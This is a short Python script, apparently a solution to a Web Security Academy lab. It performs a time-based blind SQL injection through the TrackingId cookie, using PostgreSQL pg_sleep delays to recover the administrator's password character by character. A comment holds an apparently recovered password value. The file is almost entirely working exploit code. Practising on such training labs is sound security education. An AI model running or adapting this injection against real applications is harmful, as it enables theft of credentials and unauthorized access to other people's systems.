import time
import string
import requests

uid = 'ac701f261e608c7180d738b8001800f5'
url = 'https://' + uid + '.web-security-academy.net/filter?category=asdf'
pwn = '' # 09tcmzjn1trwj0m2y7gs

for j in range(1,100):
    for i in string.printable:
        cookies = {"TrackingId":"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1," + str(j) + ")='" + (pwn+i) + "')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"}

        start = int(time.time())
        resp = requests.get(url, cookies=cookies)
        end = int(time.time())

        if end - start >= 10:
            pwn += i
            print(pwn)
            break
